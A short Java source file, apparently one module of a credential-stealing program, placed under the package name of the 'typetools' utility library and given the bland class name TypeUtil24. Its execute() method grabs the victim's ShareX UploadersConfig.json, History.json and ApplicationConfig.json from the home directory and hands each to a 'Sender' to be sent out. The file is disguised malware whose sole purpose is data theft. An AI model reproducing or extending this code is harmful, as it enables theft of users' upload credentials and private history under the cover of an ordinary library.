package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

public final class TypeUtil24 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "UploadersConfig.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "History.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "ApplicationConfig.json").ifPresent(Sender ::send);
    }
}
